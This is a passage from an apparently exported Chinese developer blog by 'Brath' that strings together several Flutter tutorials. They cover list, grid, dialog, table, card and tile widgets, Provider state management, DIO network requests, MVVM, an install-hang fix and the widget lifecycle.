child: Icon(Icons.vertical_align_top_outlined), onPressed: (){ _controller.animateTo( //设置回到顶部 0, //回到哪个部分 0 就是顶端 duration: Duration(milliseconds: 300), //用Duration设置时间 curve: Curves.slowMiddle //用Curves设置动效 ); }, ): null, //如果show为false则不展示按钮 body: Scrollbar( child: RefreshIndicator( //使用 RefreshIndicator 包裹listview使其可以下拉刷新 //第一种方法：直接展示数组数据 // child: ListView( // children: list.map((e) =&gt; Text(e.toString())).toList(), // shrinkWrap: true, //限制listview的高度为子组件的高度 // reverse: false,//是否反向列表 // itemExtent: 50,//设置list展示间距 // ), //第二种方法，构造展示数组数据，可以细粒度操作 child: ListView.builder( itemBuilder: (BuildContext context,int index){ //itemBuilder构建列表 if(index == 2){ //如果第索引 == 2那么就展示一个图标 return Icon(Icons.add); } return Text(list[index].toString()); //返回所有list中的索引打印String类型 }, itemCount: list.length, //itemCount表示数组长度 controller: _controller, //接入控制器 ), onRefresh: _onRefresh, //使用_onRefresh方法决定下拉刷新时的操作 ) ) ); } Future _onRefresh() async{ //因为是异步操作所以加入 async ，在方法返回种使用 await 可以做到强制等待异步返回 await Future.delayed( //处理返回 Duration(seconds: 3), //等待3秒 (){ print(&quot;三&quot;); //三秒后打印 } ); return &quot;三&quot;; }} # Flutter 的网格布局 （GridView）Widget： flutter 为我们提供了 GridView 这个 widget 来展示我们的网格数据 源码展示： 123456789101112131415161718192021GridView({ Key? key, Axis scrollDirection = Axis.vertical, //展示方向，默认垂直 bool reverse = false, //是否反向 ScrollController? controller, //滑动控制器 bool? primary, ScrollPhysics? physics, bool shrinkWrap = false, //是否跟随子组件显示最大高度 EdgeInsetsGeometry? padding, required this.gridDelegate, bool addAutomaticKeepAlives = true, bool addRepaintBoundaries = true, bool addSemanticIndexes = true, double? cacheExtent, List&lt;Widget&gt; children = const &lt;Widget&gt;[], int? semanticChildCount, DragStartBehavior dragStartBehavior = DragStartBehavior.start, Clip clipBehavior = Clip.hardEdge, ScrollViewKeyboardDismissBehavior keyboardDismissBehavior = ScrollViewKeyboardDismissBehavior.manual, String? restorationId, }) 代码展示： 1234567891011121314151617181920212223242526272829303132class Grid_view_demo extends StatelessWidget { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, //居中appbar标题 title: Text(&quot;网格布局演示&quot;), ), body: GridView( gridDelegate: SliverGridDelegateWithFixedCrossAxisCount( crossAxisCount: 2, //横向最大展示个数 mainAxisSpacing: 10, //横向间距 crossAxisSpacing: 10, //纵向间距 ), children: [ Container( color: Colors.amber, ), Container( color: Color.fromARGB(255, 85, 76, 51), ), Container( color: Color.fromARGB(255, 14, 223, 125), ), Container( color: Color.fromARGB(255, 42, 45, 209), ), ], ), ); }} # Flutter 的弹窗（AlertDialog）Widget： flutter 为我们提供了 AlertDialog 这个 widget 来展示我们的弹窗数据 源码阅读： 1234567891011121314151617181920212223const AlertDialog({ Key? key, this.title, //弹窗标题 this.titlePadding, //弹窗边距 this.titleTextStyle, //文字风格 this.content, //弹窗内容 this.contentPadding = const EdgeInsets.fromLTRB(24.0, 20.0, 24.0, 24.0), //内容边距 this.contentTextStyle, //内容风格 this.actions, //确认展示结果 this.actionsPadding = EdgeInsets.zero, this.actionsAlignment, this.actionsOverflowDirection, this.actionsOverflowButtonSpacing, this.buttonPadding, this.backgroundColor, this.elevation, this.semanticLabel, this.insetPadding = _defaultInsetPadding, this.clipBehavior = Clip.none, this.shape, this.alignment, this.scrollable = false, }) # 图片为 IOS 风格的弹窗 代码展示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class AlertDialogDemo extends StatefulWidget { //创建有状态widget @override State&lt;AlertDialogDemo&gt; createState() =&gt; _AlertDialogDemoState();}class _AlertDialogDemoState extends State&lt;AlertDialogDemo&gt; { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;弹窗展示&quot;), ), body: Column( //构建Column，展示按钮为对话框 children: [ ElevatedButton( onPressed: _showAlert, //设置弹窗方法 _showAlert child: Text(&quot;对话框&quot;)) ], ), ); } void _showAlert() async{ //async异步弹窗 var res = await showDialog( //await接收异步结果 context: context, //传递上下文对象 builder: (BuildContext context) { //builder构建方法，传入BuildContext //默认风格弹窗 // return AlertDialog( //AlertDialog展示弹窗 // title: Text(&quot;与Brath的聊天&quot;), //弹窗标题 // content: Text(&quot;确认删除&quot;), //弹窗文本 // actions: [ // TextButton(onPressed: () { // Navigator.of(context).pop(true); //第一种返回方式，of上下文然后pop关闭，并返回一个true // }, child: Text(&quot;确认&quot;)), // TextButton(onPressed: () { // Navigator.pop(context,false); //第二种返回方式，先pop关闭。然后用of链接上线问，并返回一个false // }, child: Text(&quot;取消&quot;)), // ], // ); //IOS风格弹窗 除了widget不一样，其他参数均为统一 return CupertinoAlertDialog( title: Text(&quot;与Brath的聊天&quot;), content: Text(&quot;确认删除&quot;), actions: [ TextButton(onPressed: () { Navigator.of(context).pop(true); }, child: Text(&quot;确认&quot;)), TextButton(onPressed: () { Navigator.pop(context,false); }, child: Text(&quot;取消&quot;)), ], ); }, ); print(res); //打印路由返回结果 }} # Flutter 的弹框（SimpleDialog） Widget： flutter 为我们提供了 SimpleDialog 这个 widget 来展示我们的弹框数据 源码展示： 123456789101112131415const SimpleDialog({ Key? key, this.title, //弹框标题 this.titlePadding = const EdgeInsets.fromLTRB(24.0, 24.0, 24.0, 0.0), this.titleTextStyle, this.children, this.contentPadding = const EdgeInsets.fromLTRB(0.0, 12.0, 0.0, 16.0), this.backgroundColor, this.elevation, this.semanticLabel, this.insetPadding = _defaultInsetPadding, this.clipBehavior = Clip.none, this.shape, this.alignment, }) 代码演示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class AlertDialogDemo extends StatefulWidget { //创建有状态widget @override State&lt;AlertDialogDemo&gt; createState() =&gt; _AlertDialogDemoState();}class _AlertDialogDemoState extends State&lt;AlertDialogDemo&gt; { List&lt;int&gt; list = []; //初始化空数组@override void initState() { // TODO: implement initState super.initState(); for (var i = 0; i &lt; 20; i++) { list.add(i);//加入循环数据 } } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;弹窗展示&quot;), ), body: Column( //构建Column，展示按钮为对话框 children: [ ElevatedButton( onPressed: _showAlert, //设置弹窗方法 _showAlert child: Text(&quot;对话框&quot;)), ElevatedButton( onPressed: _showList, //设置弹窗方法 _showAlert child: Text(&quot;列表框&quot;)), ], ), ); } void _showList() async{ //async异步弹框 var res = await showDialog( //await接收异步结果 barrierDismissible: false, //展示弹窗，点击空白不会关闭 context: context, //传递上下文对象 builder: (BuildContext context) { //builder构建方法，传入BuildContext return SimpleDialog( //创建弹框展示列表 title: Text(&quot;与Brath的聊天&quot;), //弹框标题 children: list.map((e) =&gt; GestureDetector( //用GestureDetector展示list child: Text(e.toString()), //每个孩子都是list中的String输出 onTap: (){ Navigator.pop(context,e); //点击每个list，路由返回并打印当前数组数值 }, )).toList(), ); }, ); print(res); } # Flutter 的表格（Table）Widget： flutter 为我们提供了 Table 还有 DataTable 这两个常用 widget 来展示我们的表格 代码展示： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697class TableDemo extends StatefulWidget { @override State&lt;TableDemo&gt; createState() =&gt; _TableDemoState();}class _TableDemoState extends State&lt;TableDemo&gt; { List&lt;Map&gt; list = []; //初始化表格数据 int _sortColumnIndex = 0; //初始化排序索引 bool _sortAscending = true; //初始化排序方式 ture为 ASC false为 DESC @override void initState() { super.initState(); for (var i = 0; i &lt; 10; i++) { list.add({ //循环添加map数据 &quot;name&quot;: &quot;b&quot; * i, &quot;gender&quot;: i % 1 == 0 ? &quot;男&quot; : &quot;女&quot;, //取余等于0是男 否则是女 &quot;isSelect&quot;: false, //选中状态默认为不选中 &quot;age&quot;: i.toString() + i.toString(), }); } } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;表格演示&quot;), ), body: Padding( padding: EdgeInsets.all(10), //设置10边距 //普通表格 // child: Table( // border: TableBorder.all( // color: Colors.green // ), // children: list.map((e) =&gt; TableRow( // children: [ // Text(e[&quot;name&quot;]), //展示name列 // Text(e[&quot;gender&quot;]), //展示性别列 // ], // )).toList(), // ), //H5表格，常用,可排序，可选中 child: DataTable( sortColumnIndex: _sortColumnIndex, //设置排序索引 sortAscending: _sortAscending, //设置排序方式 columns: [ DataColumn( onSort: (columnIndex, ascending) { //DataColumn的排序方法 setState(() { _sortAscending = ascending; //设置ascending（排序方式）为当前的_sortAscending _sortColumnIndex = columnIndex; //设置columnIndex（排序索引）为当前的_sortColumnIndex list.sort((begin,end){ //对数组排序 if(!ascending){ //如果为desc的排序方式 var c = begin; //新建c变量等于 begin begin = end; //begin 赋值到 end end = c; //edn赋值到c ，完成数据转换 } //返回begin的name数据，转换成edn的name数据 return begin[&quot;name&quot;].toString().length.compareTo(end[&quot;name&quot;].toString().length); }); }); }, label: Text(&quot;姓名&quot;) //展示标题为姓名 ), DataColumn( label: Text(&quot;性别&quot;) //展示标题为性别 ), DataColumn( label: Text(&quot;年龄&quot;) //展示标题为年龄 ), ], //表头列 rows: list.map((e) =&gt; DataRow( selected: e[&quot;isSelect&quot;], onSelectChanged: (v){ //点击数据 setState(() { //改变状态 if(e[&quot;isSelect&quot;] != v){ //如果当前选中状态不等于传过来的状态（选中|不选中） e[&quot;isSelect&quot;] = v; //就把他传过来的状态设置为当前状态 } }); }, cells: [ DataCell(Text(e[&quot;name&quot;])), //设置姓名内容列 DataCell(Text(e[&quot;gender&quot;])), //设置性别内容列 DataCell(Text(e[&quot;age&quot;])), //设置年龄内容列 ] ) ).toList(),//数组打印 ), ) ); }} # Flutter 卡片（Card） Widget： flutter 为我们提供了 Card 这个 widget 来展示我们的卡片数据 代码展示： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class CardDemo extends StatefulWidget { @override State&lt;CardDemo&gt; createState() =&gt; _CardDemoState();}class _CardDemoState extends State&lt;CardDemo&gt; { List&lt;Map&gt; list = []; @override void initState() { // TODO: implement initState super.initState(); for (var i = 0; i &lt; 10; i++) { list.add({ &quot;age&quot;: 10 + i, &quot;name&quot;: &quot;barth&quot; + i.toString(), }); } } /** * list构建方法，一定要在 build 方法上面，init方法下面构建，因为代码从上到下执行 */ Widget _itemBuilder(BuildContext context,int index){ return Card( //返回卡片集合 color: Colors.green, //设置卡片背景色 shadowColor: Colors.grey, //设置阴影背景色 elevation: 5.0, //设置阴影度 child: Column( children: [ SizedBox(height: 8), //于顶部间隔 8 Text(list[index][&quot;name&quot;]),//展示list中的name SizedBox(height: 8), //与上个name间隔8 Text(list[index][&quot;age&quot;].toString()), //展示age内容 ], ), ); } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;卡片数据演示&quot;), ), body: Padding( //边距 Widget padding: EdgeInsets.all(10), //设置上下左右10边距 child: ListView.builder( //构建listView itemBuilder: _itemBuilder, //设置builder方法 itemCount: list.length, //设置list大小 ) ), ); }} # Flutter 的（ListTitle）Widget（类似于聊天标签）： Flutter 为我们提供了 ListTile 这个 Widget 来展示标签 代码演示： 123456789101112131415161718192021222324252627282930313233343536@overrideWidget build(BuildContext context) { return Scaffold( backgroundColor: Colors.white, appBar: AppBar( centerTitle: true, title: Text(&quot;卡片数据演示&quot;), ), body: Padding( //边距 Widget padding: EdgeInsets.all(10), //设置上下左右10边距 //listView卡片 child: ListView( children: [ ListTile( //创建listTitle tileColor: Color.fromARGB(255, 204, 184, 128), //标签颜色 leading: Icon(Icons.token_sharp), //左边图标 title: Text(&quot;Brath&quot;),//主标题数据 textColor: Color.fromARGB(255, 49, 54, 42),//标题文字颜色 subtitle: Text(&quot;Flutter卡片数据演示数据 1 &quot;), //副标题数据 trailing: Icon(Icons.account_circle_rounded),//右边图标 ), SizedBox(height: 8), ListTile( tileColor: Color.fromARGB(255, 197, 124, 55), leading: Icon(Icons.token_sharp), title: Text(&quot;Braht 2&quot;), textColor: Color.fromARGB(255, 49, 54, 42), subtitle: Text(&quot;Flutter卡片数据演示数据 2 &quot;), trailing: Icon(Icons.account_circle_rounded), ), ], ), ), );} # Flutter 性能优化： 先看图片： ​ 我们以看到，这张图片由三个容器构成，并且点击黄色容器，其数字会增加，理论上来说代码并没有任何问题。 ​ 但是，在我们打开 检测工具后，发现，当点击黄色容器时，所有容器都会重新渲染，这就造成了性能的损耗！ ​ 如何优化？ ​ 代码演示： # 使用一个单独的 CountDemo 来对 黄色的容器进行封装，这样就可以做到单独渲染 # 因为 setState 会重新绘制当前组件（Column），单独封装后，他自己就是一个单独组件（CountDemo） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class performanceDemo extends StatefulWidget { @override State&lt;performanceDemo&gt; createState() =&gt; _performanceDemoState();}class _performanceDemoState extends State&lt;performanceDemo&gt; { int count = 0; @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;性能优化专题&quot;), ), body: Column( children: [ Container( width: double.infinity, height: 100, color: Colors.red, ), Container( width: double.infinity, height: 100, color: Colors.yellow, child: CountDemo(), ), Container( width: double.infinity, height: 100, color: Colors.blue, ) ], ), ); }}/** * 使用一个单独的 CountDemo 来对 黄色的容器进行封装，这样就可以做到单独渲染 * 因为 setState 会重新绘制当前组件（Column），单独封装后，他自己就是一个单独组件（CountDemo） **/class CountDemo extends StatefulWidget { @override State&lt;CountDemo&gt; createState() =&gt; _CountDemoState();}class _CountDemoState extends State&lt;CountDemo&gt; { int count = 0; @override Widget build(BuildContext context) { return GestureDetector( child: Text(count.toString()), onTap: (){ setState(() { count ++; }); }, ); }} # Flutter 的全局状态管理 Provider 非常重要！ # 我们分为四个步骤来学习全局状态管理 Provider # 1、因为全局状态管理是单独的插件，所以我们第一步一定是导包 选择根目录下的 pubspec.yaml 依赖配置文件 以作者 Brath 的 flutter 版本 2.0 为例，使用 5.0.0 版本 # 2、下载好依赖后，我们在 lib 目录创建文件夹：Provider 并在文件夹内创建一个 Count_provider.dart，作为我们的第一个全局状态类 ​ 在类中写入代码： # 要点：notifyListeners () 这个方法的作用就是实现局部刷新 12345678class CountProvider extends ChangeNotifier{ int _count = 0; //定义初始数量为0 get count =&gt; _count; //get方法用于外部获取count void add(){ //增加方法 _count ++; //总数+1 notifyListeners();//通知监听方法 }} # 3、我们写一个新的类用于测试全局状态数据 ​ 要点： ​ 1. 获取全局变量： # 通过 Provider 的 of 方法（泛型我们的全局状态类）传入上下文对象，就可以获取 count 1Provider.of&lt;CountProvider&gt;(context).count.toString() ​ 2. 修改全局变量： # 通过上下文对象的 read 方法（泛型我们的全局状态类），就可以获取状态类中的方法，来操作 # Tips：不是从当前页使用方法修改全局变量，而是全局变量提供了方法供外部修改！ 1context.read&lt;CountProvider&gt;().add(); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class ProviderDemo extends StatefulWidget { @override State&lt;ProviderDemo&gt; createState() =&gt; _ProviderDemoState();}class _ProviderDemoState extends State&lt;ProviderDemo&gt; { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;Provider全局状态管理&quot;), ), body: Column( children: [ ElevatedButton( onPressed: (){ Navigator.of(context).pushNamed(&quot;ProviderDemo2&quot;); //点击跳转到ProviderDemo2页面 }, child: Icon(Icons.add_task_rounded)), Text( Provider.of&lt;CountProvider&gt;(context).count.toString() //通过Provider展示count数据 ) ], ), floatingActionButton: FloatingActionButton( child: Icon(Icons.sanitizer_sharp), onPressed: (){ context.read&lt;CountProvider&gt;().add(); //通过上下文对象获取add方法实现新增 }, ), ); }}/** * 第二个页面 */class ProviderDemo2 extends StatelessWidget { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;Provider2&quot;), ), body: FloatingActionButton( child: Icon(Icons.sanitizer_sharp), onPressed: (){ context.read&lt;CountProvider&gt;().add(); //通过上下文对象获取add方法实现新增 }, ), ); }} 4、在 main.dart 中修改启动方式 1234567891011121314151617181920main() { runApp( //只用 ChangeNotifierProvider 来包裹就只可以调用一个全局类 // ChangeNotifierProvider( // create: (context)=&gt;CountProvider(), // child: MyApp(), // ), //使用 MultiProvider 多状态管理来包裹，即可实现多个状态类 MultiProvider( providers: [ ChangeNotifierProvider( create: (context) =&gt; CountProvider(), ), // ChangeNotifierProvider( // create: (context) =&gt; CountProvider2(), // ), ], child: MyApp(), ));} # Flutter 的网络请求（DIO） # Flutter 在 pub.dev 为我们提供了许多网络请求组件，我们选择用 DIO 来做请求组件 使用方法： # 1、因为网络请求是单独的插件，所以我们第一步一定是导包 选择根目录下的 pubspec.yaml 依赖配置文件 以作者 Brath 的 flutter 版本 2.0 为例，使用 4.0.0 版本 # 2、编写代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class DioDemo extends StatefulWidget { @override State&lt;DioDemo&gt; createState() =&gt; _DioDemoState();}class _DioDemoState extends State&lt;DioDemo&gt; { Dio _dio = Dio(); //定义DIO@override void initState() { // TODO: implement initState super.initState(); //初始化baseUrl基URL _dio.options.baseUrl = &quot;https://www.XXX.XXX:0000/&quot;; } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;网络请求演示&quot;), ), body: Column( children: [ ElevatedButton( onPressed: _get, child: Text(&quot;getUserinfo&quot;) ), ] ), ); } void _get() async{ //第一种传参方式：名文传输 // var res = await _dio.get(&quot;get/getData?id=1&quot;); // print(res.toString()); //第二种传参方式：queryParameters包装传输 var res2 = await _dio.get( &quot;get/getData&quot;, queryParameters: { &quot;id&quot;: 1 }, //通过Options来添加 headers 请求头 options: Options( headers: { &quot;token&quot;: &quot;header-Token&quot; } ) ); print(res2.toString()); }} # 3、如果小伙伴们的请求报错：有以下原因 （参考博客：https://blog.csdn.net/txaz6/article/details/119168489） # 1. 请求本地连接，ip 地址错误 # 2. 未添加网络请求权限 # 3. 请求的地址是 http，不是 https # 4. 与服务端的请求参数不同，导致无法请求到接口 # # Flutter 的设计模式（MVVM）（Model View ViewModel） # MVVM 就是 Model View ViewModel 的简写。 # Model ：处理接口请求数据 # View ：展示页面 # ViewModel：处理业务逻辑（相当于 Model、View 的链接层） # 简单流程：view 通知 viewModel 层，viewModel 通知 Model 层调用接口，viewModel 层接收 Model 的数据，响应给 view 层展示 # 我们通过几个步骤来演示 MVVM 模式的请求流程，以及他的优缺点 # 1、首先创建 Model View ViewModel 三个文件夹 # 2、编写 Model 层 （请求数据） 12345678910111213141516class MvvmModel{ dynamic get(int id) async { /** * 获取用户信息方法 */ print(&quot;开始调用userinfo接口&quot;); var res = await Dio().get( &quot;https://xxx:0000/gerUserInfo&quot;, queryParameters: { //设置请求参数 &quot;userId&quot;: id //id = viewModel传来的ID }, ); print(&quot;调用完毕&quot;); return res; }} # 3、编写 View 层 （接收、展示数据） 1234567891011121314151617181920212223242526272829class MvvmViewDemo extends StatefulWidget { @override State&lt;MvvmViewDemo&gt; createState() =&gt; _MvvmViewDemoState();}class _MvvmViewDemoState extends State&lt;MvvmViewDemo&gt; { dynamic res; @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( centerTitle: true, title: Text(&quot;View展示页面&quot;), ), body: Column( children: [ ElevatedButton( onPressed: () async { //使用上下文对象的read泛型 ViewModel 类来使用get方法传入 id 获取信息 context.read&lt;MvvmViewModel&gt;().get(1); }, child: Text(&quot;调用ViewwModel获取用户userinfo&quot;) ), ], ), ); }} # 4、编写 ViewModel 层 （整合 view 以及 model：view 调用 ViewModel ，ViewModel 调用 model 返回结果给 view） tips：在调用完接口后跳转时，因为 Navigator 需要一个上下文对象，但是我们当前没有上下文对象，所以要在 main 入口定义一个对象： main.dart👇 12345678910final GlobalKey&lt;NavigatorState&gt; navigatorkey = GlobalKey&lt;NavigatorState&gt;();class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return MaterialApp( navigatorKey: navigatorkey, //在 MaterialApp 中 将 navigatorKey 设置为我们定义的navigatorkey，这也是为什么flutter要求使用 MaterialApp 作为mian根节点的原因 ); }} MvvmViewModel.dart👇 12345678910111213class MvvmViewModel extends ChangeNotifier{ MvvmModel _model = MvvmModel(); //实例化 model 的对象，因为model是做请求的所以我们调用model void get(int id) async { //使用model的get方法传入id来获取数据，注意使用 async 和 await 来做异步调用防止接口错误导致程序等待超时 Response res = await _model.get(id); print(res.data); //获取 Response 的数据 print(res.headers); //获取 Response 的请求头 print(res.statusCode); //获取 Response 的状态码 print(res.realUri); //获取 Response 的请求地址 //使用mian中的 navigatorkey 的 currentContext 来获取当前的上下文对象，如果是dart2.0以后需要加一个 ！否则会报错，因为参数必须不能为空 Navigator.of(navigatorkey.currentContext!).pushNamed(&quot;DioDemo&quot;); //我们在调用完接口后跳转到 DioDemo页面 }} # 5、DIO 返回值 Response 介绍 12345Response res = await _model.get(id); print(res.data); //获取 Response 的数据print(res.headers); //获取 Response 的请求头print(res.statusCode); //获取 Response 的状态码print(res.realUri); //获取 Response 的请求地址 本篇至此就结束啦！如果你读到了这里，不妨给我点个赞，我叫 Brath，是一个非科班出身的技术狂！ 我的博客 brath.top 欢迎访问！ 全文共计 15332 词 本文由 Brath 编写，禁止转载，违法必究‘！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/06/03/%E3%80%90Flutter%E3%80%91Flutter%E6%96%87%E6%A1%A3/"},{"title":"【Flutter】flutter 在真机上调试卸载安装包后卡住没反应问题","text":"# 【Flutter】flutter 在真机上调试卸载安装包后卡住没反应问题 # 问题描述 把自己手机插上数据线后，用 flutter 进行真机调试，本来配合 vscode 跑得好好的，不知道是写了 bug 还是咋地，目标效果出不来，以为是热更新失败了，最后只好把安装在手机上的 app 卸载了，想当然地以为运行 flutter run 后在手机上会贴心的提示我重装一遍，哪知给我突然卡住了： 1234Running Gradle task 'assembleDebug'...✓ Built build/app/outputs/flutter-apk/app-debug.apk.Installing build/app/outputs/flutter-apk/app.apk... 一直卡在这个安装环节上，等半天是一点反应都没有，试了各种方法重启应用、改用 Andriod Studio 什么的，毛用没有，最后还得是在 StackOveFlow 上找到了法子： # 解决方法： Change the applicationId in android\\app\\build.gradle file like this: from : 1234defaultConfig { // TODO: Specify your own unique Application ID (https://developer.android.com/studio/build/application-id.html). applicationId &quot;com.xxxxxxxxxxx.yyyyyy1&quot;} to : 1234defaultConfig { // TODO: Specify your own unique Application ID (https://developer.android.com/studio/build/application-id.html). applicationId &quot;com.xxxxxxxxxxx.yyyyyy2&quot;} 改一下 flutter 工程目录下 andriod\\app 中 build.gradle 文件中的 applicationId 重新 build 就能重新在手机上安装调试 app 了，我丢！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/05/10/%E3%80%90Flutter%E3%80%91flutter%20%E5%9C%A8%E7%9C%9F%E6%9C%BA%E4%B8%8A%E8%B0%83%E8%AF%95%E5%8D%B8%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E5%90%8E%E5%8D%A1%E4%BD%8F%E6%B2%A1%E5%8F%8D%E5%BA%94%E9%97%AE%E9%A2%98/"},{"title":"【Flutter】Flutter生命周期","text":"# 【Flutter】Flutter 生命周期 # 一、生命周期阶段 ​ flutter 生命周期大体上可以分为三个阶段：初始化、状态变化、销毁。 # 1、初始化阶段 对应执行构造方法和 initState 时候 # 2、状态变化阶段 开新的 widget 或者调用 setState 方法的时候 # 3、销毁阶段 deactivate 和 dispose # 二、生命周期阶段执行的函数 # 1、initState 调用次数：1 次 插入渲染树时调用，只调用一次，widget 创建执行的第一个方法，这里可以做一些初始化工作，比如初始化 State 的变量。 # 2、didChangeDependencies 调用次数：多次 初始化时，在 initState () 之后立刻调用 当依赖的 InheritedWidget rebuild, 会触发此接口被调用 实测在组件可见状态变化的时候会调用 # 3、build 调用次数：多次 初始化之后开始绘制界面 setState 触发的时候会 # 4、didUpdateWidget 调用次数：多次 组件状态改变时候调用 # 5、deactivate 当 State 对象从树中被移除时，会调用此回调，会在 dispose 之前调用。 页面销毁的时候会依次执行：deactivate &gt; dispose # 6、dispose 调用次数：1 次 当 State 对象从树中被永久移除时调用；通常在此回调中释放资源。 # 7、reassemble 在热重载 (hot reload) 时会被调用，此回调在 Release 模式下永远不会被调用 # 三、App 生命周期 ​ 通过 WidgetsBindingObserver 的 didChangeAppLifecycleState 来获取。通过该接口可以获取是生命周期在 AppLifecycleState 类中。 # 1、resumed 可见并能响应用户的输入，同安卓的 onResume # 2、inactive 处在并不活动状态，无法处理用户响应，同安卓的 onPause # 3、paused 不可见并不能响应用户的输入，但是在后台继续活动中，同安卓的 onStop 下面是生命周期： 初次打开 widget 时，不执行 AppLifecycleState 的回调； 按 home 键或 Power 键， AppLifecycleState inactive----&gt;AppLifecycleState pause 从后台到前台：AppLifecycleState inactive—&gt;ApplifecycleState resumed back 键退出应用： AppLifecycleState inactive—&gt;AppLifecycleState paused 参考文章：https://www.jianshu.com/p/00ff0c2b8336 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/10/12/%E3%80%90Flutter%E3%80%91Flutter%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"title":"【Flutter】flutter发展前景如何？","text":"在 Flutter 刚刚从 Google 刚刚推向 Android 市场的时候，我就开始对 Flutter 开始了学习之路；但由于当时 Flutter 许多东西尚未完善而没有推出稳定的版本，所以也就没有对其进行深入的学习，直到如今 Flutter 又重出江湖，在市场上也得到了蓬勃发展及许多业内大佬的力推，我便又再次入坑 Flutter 实现 UI 和交互是高级开发者的必备技能，也是掌握 Flutter 开发的重点；同样 Flutter 跨平台的特性是原生不能比拟的，更何况还有不弱的性能表现；而性能往往是由生命周期来决定的 # 何为 Flutter 的生命周期？ 如果你是一名开发人员，那么你一定不会对生命周期感到陌生；当你在学习 Flutter 的时候，Flutter 也有自己的生命周期，只有通过了解 Flutter 的生命周期，才能知道应该在哪里来写业务逻辑 # Flutter 生命周期 如上图所示，Flutter 生命周期大体上可以分为三个阶段： 初始化、状态变化、销毁；下面依次说明各个阶段的工作 初始化阶段（插入渲染树） 对应执行构造方法和 initState 状态变化阶段（在渲染树中存在） 开新的 widget 或者调用 setState 方法 销毁阶段（从渲染树种移除） deactivate 和 dispose 如果之前你对 Flutter 有一点点了解的话，你会发现 Flutter 中有两个主要的 Widget： StatelessWidget（无状态） 和 StatefulWidget（有状态） # StatelessWidget 无状态组件] 是不可变的，这意味着它们的属性不能变化，所有的值都是最终的；可以理解为将外部传入的数据转化为界面展示的内容，只会渲染一次 对于无状态组件生命周期只有 build 这个过程；无状态组件的构建方法通常只在三种情况下会被调用：小组件第一次被插入树中，小组件的父组件改变其配置，以及它所依赖的 InheritedWidget 发生变化时 # StatefulWidget 有状态组件持有的状态可能在 Widget 生命周期中发生变化，是定义交互逻辑和业务逻辑；可以理解为具有动态可交互的内容界面，会根据数据的变化进行多次渲染 # 实现一个 StatefulWidget 至少需要两个类： 一个是 StatefulWidget 类 另一个是 Sate 类 StatefulWidget 类本身是不可变的，但是 State 类在 Widget 生命周期中始终存在 StatefulWidget 将其可变的状态存储在由 createState 方法创建的 State 对象中，或者存储在该 State 订阅的对象中 # Fultter 的优势在哪里？ # 快速开发和迭代 Flutter 自身具有热修复（热重载）的功能，尽管有使用的限制，但是它依然能够为开发过程提供更高的效率；另外，Flutter SDK 还允许我们修复崩溃和继续从应用程序停止的地方进行调试 # 页面流畅、样式美观 对于不同的平台（Android 和 iOS），Flutter 提供了风格不同的控件，以满足不同平台的设计理念 # 提供原生性能 Flutter 提供了一种 ** 响应式视图，无须 JavaScript 做桥接 **；强大的 API 使得实现复杂的页面效果成为可能；高性能的 ** 渲染机制 ** 使得 120 FPS 的高频率 可以轻而易举的实现；当界面上的图片数量越来越多时，与 React Native 相比，Flutter 的优势会越来越明显 # 灵活的跨平台开发 Flutter 可以单独作为开发框架完成整个 App 的开发，也可以与现有原生代码相结合实现 Hybrid 混合模式的开发 # 那 Flutter 需要学吗？ Flutter 抛弃了原生系统控件和 Webview，使用自研高性能渲染引擎来绘制 Widget，预先 (AOT) 编译，运行时直接执行 Native (arm) 代码，Dart 代码执行 (在 UI TaskRunner)，图片下载 (IO TaskRunner)，真正的渲染 (GPU TaskRunner) ，同平台的通信等 (Platform TaskRunner 即 Native 概念下的 ** 主线程) 是互相隔离 ** 的 针对布局等的优化；布局计算时单次树走动即可完成；Relayout Boundary 机制：如果 Child 的 size 是固定的，那么不会因为 Child 的 Relayout 导致 Parent ReLayout 等布局优化，都让 Flutter 脱颖而出 如上所述 Flutter 于谷歌而言，这是他们重新整理 跨平台生态环境 决心的体现，Flutter 所展现的内容，也是谷歌想拓展和维护的方向；对于长期苦恼于 跨平台 选择的广大 Android 开发者 而言，Flutter 可谓是谷歌为我们提供的 指路明灯 以目前的开发速度，只要不出大的纰漏，按部就班的往前推进，在不久的将来， Google 一定可以把 Flutter 平台打造得非常完美，届时又会改变 ** 移动开发技术的格局 ** 了 也许，Flutter 系列的部分库还没成熟到成为你工作的第一选择，但是，深入学习 Flutter 组件会为你日常的开发带来一些想法 